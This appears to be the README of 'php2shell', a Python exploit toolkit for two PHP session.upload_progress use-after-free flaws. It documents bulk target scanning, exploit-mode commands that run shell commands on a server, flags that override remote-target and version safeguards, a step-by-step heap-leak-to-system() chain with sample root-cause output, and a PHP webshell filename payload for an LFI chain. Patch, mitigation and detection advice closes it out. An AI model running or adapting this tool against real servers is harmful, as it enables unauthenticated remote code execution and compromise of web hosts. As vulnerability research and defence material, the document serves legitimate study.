# CVE-2026-109618 / CVE-2026-109619: php2shell

One-shot RCE proof of concept for the PHP `session.upload_progress` use-after-free vulnerabilities. The exploit chains a heap leak, a libphp leak, and a forged `pDestructor` call to reach `zif_system`  all over plain HTTP against a single `<?php echo "OK\n"; ?>` page, with no authentication and no target-side code.

PHP 5.4.0 through 8.5.11 are affected (14 years of vulnerable code). PHP issued emergency patches on 2026-10-21. Use this only against systems you own or are authorized to test.

## Vulnerability summary

| Field | CVE-2026-109618 | CVE-2026-109619 |
|-------|-----------------|-----------------|
| Type | RCE via OOM memory corruption | RCE via stale global state after request |
| Root cause | `longjmp()` after OOM leaves `PS(http_session_vars)` dangling | Worker retains freed request memory across requests |
| Entry point | `session.upload_progress` multipart callback (before RINIT) | SAPI multipart parser / session handler |
| CVSS v4.0 | 9.2 Critical | 9.2 Critical |
| GHSA | [GHSA-w8hw-w9fx-j79w](https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w) | [GHSA-6wmf-4rv5-p3rp](https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp) |

## Affected versions

All PHP versions with `session.upload_progress` support (introduced PHP 5.4.0, March 2012).

| Branch | Vulnerable | Fixed |
|--------|-----------|-------|
| 8.5 | <= 8.5.11 | 8.5.12 |
| 8.4 | <= 8.4.26 | 8.4.27 |
| 8.3 | <= 8.3.35 | 8.3.36 |
| 8.2 | <= 8.2.34 | 8.2.35 |
| 8.1 and older | All | EOL — no patch; upgrade |

## Requirements

- Python 3.9+
- Docker Engine + Docker Compose v2
- No third-party Python packages (stdlib only)

## Usage

### Check mode (passive fingerprint)

GET-only version check against `X-Powered-By` header. No exploit traffic sent.

```sh
# Single target
python3 php2shell.py check -u https://example.com/

# Bulk target list (one URL per line, # comments ok)
python3 php2shell.py check -f targets.txt -o results.jsonl --workers 8

# Through Burp
python3 php2shell.py check -u https://example.com/ -p http://127.0.0.1:8080

# JSON output
python3 php2shell.py check -u https://example.com/ --json
```

Exit code 2 means at least one target is `likely_vulnerable`.

### Exploit mode (RCE)

Requires the Docker lab or equivalent target. Linux + Apache mod_php prefork only (see [Platform scope](#platform-scope)).

```sh
# Start the vulnerable target
docker compose -f docker/docker-compose.yml up -d
for i in $(seq 1 20); do
  curl -fsS http://127.0.0.1:8088/index.php >/dev/null 2>&1 && break
  sleep 0.5
done

# Run (auto-derives libphp offsets from the container)
python3 php2shell.py exploit -u http://127.0.0.1:8088/index.php
```

Expected output:

```
  php2shell  ·  CVE-2026-109618 / CVE-2026-109619
  one-shot pre-auth RCE  ·  Apache mod_php prefork
  authorized testing only

00:00.00  TARGET    http://127.0.0.1:8088/index.php
00:00.00  OK        Server: Apache/2.4.69 (Debian)  ·  PHP 8.4.26
00:00.13  ARCH      detected amd64 from container 'php2shell-target'
00:00.13  PROFILE   php-8.4.26-bookworm-amd64 rce=verified  (preflight PHP 8.4.26)
00:00.13  PROBE     memory_limit probe: 16 MiB body
00:00.15  OK        detected memory_limit = 8M
00:00.15  CMD       'sh</out/c' (original: 'id;hostname -I;hostname')
00:00.15  OFFSETS   loaded from out/offsets.env
00:00.15  OFFSETS   zif=0x465370  dtor=0x65eb60  htdata=0x690d8
00:00.86  STAGE 1   heap leak (attempt 1/3)
00:02.19  OK        chunk base = 0x7fad8c400000
00:03.02  STAGE 2   libphp leak (attempt 1/3)
00:04.20  OK        libphp base = 0x7fad8e135000
00:05.03  STAGE 3   htdata=0x7fad8c4690d8  zif=0x7fad8e59a370
00:06.64  OK        stage 3 attempt 1 succeeded

[+] PRE-AUTH RCE CONFIRMED

PROOF:
uid=33(www-data) gid=33(www-data) groups=33(www-data)
172.19.0.2
<container-hostname>
```

The default command is `id;hostname -I;hostname`. Commands longer than 14 bytes are automatically written to `out/c` and executed via `sh</out/c`. For a short command that fits in the 14-byte payload directly:

```sh
python3 php2shell.py exploit -u http://127.0.0.1:8088/index.php -c 'id>/out/p1'
```

Before running, exploit mode:
1. Sends one GET to check the `Server` header: IIS, nginx, or Windows-Apache targets are declined (not mod_php prefork on Linux — see [Platform scope](#platform-scope)). A stripped or absent header never blocks.
2. Checks `X-Powered-By` against the fix table: PHP at or past `8.2.35` / `8.3.36` / `8.4.27` / `8.5.12` is declined.
3. Picks a build profile from `profiles/*.json` by matching the preflight PHP version (and `uname -m` for local containers, or `--arch` for remote).
4. Sends one OOM probe to read `memory_limit` from the fatal message and bumps `--huge-mb` if needed.

Non-loopback targets require `--allow-remote`. Override any decline with `--force`, skip preflight with `--no-preflight`, skip the memory probe with `--no-probe`, strip color with `--no-color`.

Profile selection:

```sh
python3 php2shell.py --list                                   # catalog
python3 php2shell.py exploit -u ... --profile php-lab         # explicit
python3 php2shell.py exploit -u ... --php-version 8.4.26 --arch amd64
python3 php2shell.py exploit -u ... --dry-run                 # don't fire
```

Run `python3 php2shell.py --help` for all options.

### Labs

Multi-version Docker labs on `127.0.0.1`. Each lab runs the same prefork config (`docker/apache.conf`, `docker/php.ini`) as a drop-in on top of the stock `php:X.Y.Z-apache` image.

```sh
python3 php2shell.py labs up        # start all labs
python3 php2shell.py labs status    # name / image / port / state / HTTP
python3 php2shell.py labs test      # reachable + preflight + profile-exists
python3 php2shell.py labs down      # remove all lab containers
```

Current coverage:

| Branch | Verified RCE | Leaks only | Not reached |
|--------|--------------|------------|-------------|
| 8.5 | 8.5.11 | | |
| 8.4 | 8.4.26, 8.4.25 | | |
| 8.3 | | 8.3.35 (stage 3 open) | |
| 8.2 | | | 8.2.34 (UAF primitive differs) |
| 8.1 | | | 8.1.34 |
| 8.0 | | | 8.0.30 |
| 7.4 | | | 7.4.33 |
| WordPress | | | 8.3.13 under `wordpress:6.6.2-php8.3-apache` (patch gap vs devploit's 8.3.33) |

`labs status` prints the live container names, ports and HTTP state. `labs test` verifies reachability + preflight + profile presence; it does not fire the chain.

Running the full roster uses ~10 prefork Apache containers; on a modest host, timing-sensitive stages (notably the OOM window and keep-alive worker pinning) can flake under that load. If exploits that previously worked start missing stage 1, tear down the labs you're not actively using and retry.

The WordPress lab is compose-based (adds a MySQL container). The bundled compose pins `wordpress:6.6.2-php8.3-apache` because the current `wordpress:php8.3-apache` ships the patched 8.3.36. Devploit's `php-8.3.33-wordpress-mod_php` profile reports leaks against 8.3.33 but no verified RCE; our 8.3.13 image doesn't leak with the current candidate sweep (likely patch drift in 20 releases of stage-param-relevant internals). Bump the WordPress tag when a newer vulnerable PHP ships in the image series.

### Calibration

Discover stage params and offsets for a new PHP build in one command. Writes `profiles/php-X.Y.Z-DISTRO-ARCH.json` and sets `rce_verified` from a real `id > /out/p1` proof.

```sh
python3 php2shell.py calibrate \
    -u http://127.0.0.1:<PORT>/index.php \
    --docker-container <LAB_NAME> \
    --image php:<X.Y.Z>-apache \
    --distro bookworm
```

The sweep tries existing calibrated profiles' stage params first (fast when the layout matches a neighbor build), then a bounded sweep around the bookworm layout. If any candidate reaches stage 3 with a verified proof, the profile is written with `rce_verified: true`. If only the stage-1 / stage-2 leaks succeed, the profile is written with `rce_verified: false` and a `notes` field explaining what landed. Existing `rce_verified: true` profiles are not overwritten without `--force`.

## Exploit chain

The target page is `<?php echo "OK\n"; ?>`; `session_start()` is not called. All attack traffic is ordinary multipart POST:

0. **Worker rotation** — OOM + session init crash kills the prefork child; the replacement inherits the same address space layout.
1. **Heap leak** — `max_input_vars` warning sets `headers_sent=1`; `PHPSESSID=\x00` allocates a new session id with `send_cookie=1`; a 12 MB field OOMs inside `php_session_initialize()`, leaving `PS(http_session_vars)` dangling. A follow-up request reoccupies the freed reference with a multipart buffer, and `php_url_encode()` reads out of bounds into `Set-Cookie`, leaking Zend MM chunk pointers.
2. **libphp leak** — Similar technique places the dangling `PS(id)` so its `ZSTR_LEN` reads a HashTable's `nTableSize=16`; the data region exposes `pDestructor = ZVAL_PTR_DTOR = libphp+offset`, decoded from `Set-Cookie`.
3. **RCE** — A 167-byte surviving `zend_string` carries a fake HashTable with `pDestructor = zif_system`. A forged reference triggers the chain `php_session_track_init -> zval_ptr_dtor -> zend_array_destroy -> pDestructor(command)`.

## Known limitations

- **`display_errors = On` is a hard requirement for the shipped chain.** Stage 1 depends on a `max_input_vars` diagnostic warning being written to the response body so `headers_sent=1` fires inside `php_session_initialize()`. With `display_errors=Off`, the warning stays in the error log and the chain breaks. 9bie's follow-up [`exploit.py`](https://github.com/9bie/php2shell-bypass-aslr-exp/blob/main/exploit.py) uses an END-cleanup `send_cookie` OOM primitive that removes this requirement; porting it is open work.
- **`memory_limit = 8M` is a hard requirement for the shipped chain.** The amplification math only overshoots an 8M limit with a body comfortably under `post_max_size`. 9bie's current chain works on stock `php.ini-production` with `memory_limit = 128M`; same open-work note.
- **Offsets come from the running container by default.** `docker/offsets.py` reads `/usr/lib/apache2/modules/libphp.so` from the named container and writes `out/offsets.env` with `ZIF_OFFSET` and `DTOR_OFFSET` extracted from its ELF symbol table. These are the real offsets for that specific binary. There are no hardcoded fallbacks any more — if auto-extraction fails and no `offsets.env` exists, the chain falls through to the per-build profile's `offsets` block (which was captured from the same symbol-table parse at calibration time). For a remote target against a different build, pass `--libphp /path/to/matching/libphp.so` or `--zif-offset` / `--dtor-offset` directly.
- **The chain is probabilistic on long-lived workers.** The OOM window is narrow; keep-alive sockets, request pipelining and ten co-tenant containers all introduce noise. Restarting the target worker (`labs down && labs up`) immediately before a run restores a clean baseline.
- **Patched PHP will not close with this chain.** The core OOM primitive is fixed in 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12. Preflight warns loudly but no longer declines, so you can see the chain fail against a patched target for yourself.

## Platform scope

The two bugs live in cross-platform PHP C code, so Windows PHP builds are vulnerable in principle. This exploit is not portable by retuning offsets, though — the hard dependency is the process model:

- **Stage 0 needs `fork()`.** Worker rotation relies on copy-on-write: the child that replaces the crashed one inherits an identical address space, so the stage 1/2 leaks stay valid. Windows has no `fork()` — Apache runs threaded (`mpm_winnt`) and PHP typically runs as recycled FastCGI (`php-cgi.exe`), both of which re-randomize on spawn. A Windows port needs a different crash-survival primitive, not new constants.
- **ASLR is not the barrier.** The `Set-Cookie` out-of-bounds read leaks the heap and libphp bases directly, so full ASLR/PIE is read off the wire on any platform.
- **Offsets and shell are Linux.** `zif_offset` / `dtor_offset` / `htdata_offset` index `libphp.so` (ELF); Windows ships `php8ts.dll` (PE) with a different layout. The leak scanner hardcodes the Linux x86-64 pointer range, and the `system("sh</out/c")` payload is POSIX.

## Detection and defense

### Check if you are vulnerable

Check your PHP version:

```sh
php -v
# or remotely (if expose_php is on):
curl -sI https://example.com/ | grep X-Powered-By
```

Any version below the fix thresholds (8.2.35, 8.3.36, 8.4.27, 8.5.12) is exposed to the OOM-based chain shipped here. Patched versions still have an upload_progress filename-storage primitive that combines with any LFI to give RCE (see "What the patch does not fix" below).

### Patch

Update PHP to the fixed version for your branch and restart all workers (Apache, FPM, etc.):

```sh
# Debian/Ubuntu
apt update && apt upgrade php*
systemctl restart apache2  # or php-fpm

# Docker
# Change image tag from php:8.4.26-apache to php:8.4.27-apache (or later)
```

The OOM chain shipped by this toolkit is blocked by commit [3584a98bda](https://github.com/php/php-src/commit/3584a98bda). A separate [PR #22113](https://github.com/php/php-src/pull/22113) closes the `PS(serializer)` leak and the `use_only_cookies` bypass; apply both for completeness.

### Mitigate (if patching is not immediately possible)

Patching is the only complete fix. The settings below reduce specific arms; none of them fully substitute for the patch.

PHP core developer [daubois.dev](https://daubois.dev/blog/cve-2026-109618-php2shell-rumors/) has explicitly stated: **do not** apply `session.upload_progress.enabled=Off` as a fix for CVE-2026-109618 — CVE-2026-109618 does not require upload_progress and the OOM path is reachable from any oversized multipart POST. The setting only closes the CVE-2026-109619 session-upload-progress arm.

```ini
; Removes the predictable allocation-failure that CVE-2026-109618 needs.
; Do NOT substitute RLIMIT_AS / RLIMIT_DATA — those cause mmap() failures
; that trigger the same vulnerable path.
memory_limit = -1

; Closes the session-upload-progress arm of CVE-2026-109619 only.
session.upload_progress.enabled = Off

; PHP 8.5 only: closes the fatal_error_backtraces arm of CVE-2026-109619.
fatal_error_backtraces = 0
```

CVE-2026-109619 has three independent arms per [JFrog's analysis](https://research.jfrog.com/post/php2shell-all-you-need-to-know-about-cve-2026-109618-and-cve-2026-109619/): `session.upload_progress`, `fatal_error_backtraces` (PHP 8.5 only), and OPcache shared memory. The OPcache arm has no INI mitigation — patch is required.

PHP 8.4 introduced `request_parse_body()` which parses `multipart/form-data` on **non-POST methods** (GET, PUT, PATCH, DELETE). POST-only WAF rules are bypassed by this path.

### What the patch does not fix

Even on fully patched PHP (8.2.35 / 8.3.36 / 8.4.27 / 8.5.12), the upload_progress primitive still writes attacker-supplied filenames raw to session files. Combined with any LFI vulnerability in the target application, this produces RCE. [Confirmed on PHP 8.5.12](https://dev.to/tanahiro2010/investigating-the-return-of-the-php2shell-nightmare-eee). The OOM chain shipped here does not exercise that path, but a defender should not assume the patch alone is sufficient if application-level LFI exists.

#### Chain A: upload_progress filename + LFI

Mechanism, in case you're assessing an application you own or are authorized to test:

1. Attacker sends `multipart/form-data` POST with a field named `PHP_SESSION_UPLOAD_PROGRESS` plus a file part whose `filename=` attribute contains PHP code (e.g. `filename="<?php system($_GET['x']); ?>"`).
2. `session.upload_progress` writes the raw filename into the session file at `session.save_path/sess_<PHPSESSID>` (default `/tmp/sess_<id>`). No sanitization, no encoding — this is the design, not a bug.
3. Attacker triggers an LFI elsewhere in the application that includes that session file (`include $_GET['page']`, `require $input`, etc.).
4. PHP interprets the session file as PHP, executes the attacker-controlled filename.

The attacker needs: a POST endpoint that reaches PHP (any), an LFI sink in the application, and the ability to read or guess their own PHPSESSID (the Set-Cookie response contains it). No OOM primitive, no offset leak, no calibration — the patch doesn't close this because filenames are supposed to be stored raw.

Not implemented here because it is bounded by the LFI, not by anything about this toolkit. A toolkit that doesn't know your LFI endpoint can't drive it; a toolkit that does is a dedicated LFI runner, not a port of the OOM chain. The research is in [tanahiro2010's write-up](https://dev.to/tanahiro2010/investigating-the-return-of-the-php2shell-nightmare-eee) and [JFrog's analysis](https://research.jfrog.com/post/php2shell-all-you-need-to-know-about-cve-2026-109618-and-cve-2026-109619/) linked above.

### Monitor

Watch Apache/FPM error logs for unexpected child crashes (SIGABRT, SIGSEGV) during normal traffic — these are a strong indicator of exploitation attempts. Unusual multipart POST requests containing `PHP_SESSION_UPLOAD_PROGRESS` fields to endpoints that do not expect file uploads are suspicious.

## Files

| Path | Purpose |
|------|---------|
| `php2shell.py` | One-shot exploit |
| `docker/docker-compose.yml` | Vulnerable target container |
| `docker/php.ini` | PHP config (display_errors, memory_limit, session) |
| `docker/apache.conf` | Single-worker prefork config |
| `docker/offsets.py` | Extract `zif_system` / `zval_ptr_dtor` offsets from an Apache `libphp.so` (via `docker cp` from a container, or directly with `--libphp PATH`) |
| `docker/www/index.php` | Minimal target page |
| `out/` | Proof output and offset cache (volume-mounted) |

## Credits

- **Wiz Research** — discovery and public analysis of PHP2Shell (CVE-2026-109618 / CVE-2026-109619). Everything below starts from that disclosure. [blog](https://www.wiz.io/blog/php2shell-php-rce)
- **9bie** — original public exploit primitive: `Set-Cookie` heap leak, libphp leak via `nTableSize`, forged `pDestructor = zif_system` via `session.upload_progress`. Stages 1–3 in `php2shell.py` are a Python port of that chain. [github.com/9bie/php2shell-bypass-aslr-exp](https://github.com/9bie/php2shell-bypass-aslr-exp)
- **Calif** — parallel research and upload-metadata amplification analysis. [calif.io/php2shell](https://calif.io/php2shell/)
- **Karasawa2025** — public research on the `display_errors=Off` direction (OOM-in-cookie primitive, page-level grooming, alternative leak path). Not shipped here.
- **WoYinDao** — public CVE-2026-109618 analysis: session lifecycle, pre-RINIT OOM window, `var_destroy` reentry UAF, cross-branch negative matrix.
- **Sansec** — public technical writeup. [sansec.io/research/php2shell](https://sansec.io/research/php2shell)
- **devploit** — version-aware dispatcher, `memory_limit` probe, build-profile factory, laboratories. Our dispatcher UX borrows from theirs. [github.com/devploit/php2shell](https://github.com/devploit/php2shell)
- **PHP security team, PHP Foundation, and release maintainers** — advisory and fixes in 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12, and the [security release notes](https://www.php.net/security/).
- **godylockz** — this Python port: single-file `check` + `exploit` modes, bulk fingerprint with threaded workers + JSONL output + proxy support, bookworm and lab calibration profiles, docker lab + auto-offset extraction (`docker/offsets.py`, now also accepting `--libphp PATH` for arbitrary ELFs), `sh</out/c` command staging for commands > 14 bytes, patch-known tracking so stripped `X-Powered-By` doesn't false-positive, CI-friendly exit codes.

## References

- [PHP security advisory 2026-10-21](https://www.php.net/archive/2026.php)
- [GHSA-w8hw-w9fx-j79w](https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w) — CVE-2026-109618
- [GHSA-6wmf-4rv5-p3rp](https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp) — CVE-2026-109619
- [Patch commit 3584a98](https://github.com/php/php-src/commit/3584a98bda)
- [Sansec analysis](https://sansec.io/research/php2shell)
- [The Hacker News coverage](https://thehackernews.com/2026/10/php-issues-emergency-patches-for-two.html)
- [BleepingComputer coverage](https://www.bleepingcomputer.com/news/security/php-ships-emergency-patches-for-critical-php2shell-flaws/)
- [Brandefense advisory](https://brandefense.io/blog/php2shell-php-rce-cve-2026-109618-109619/)
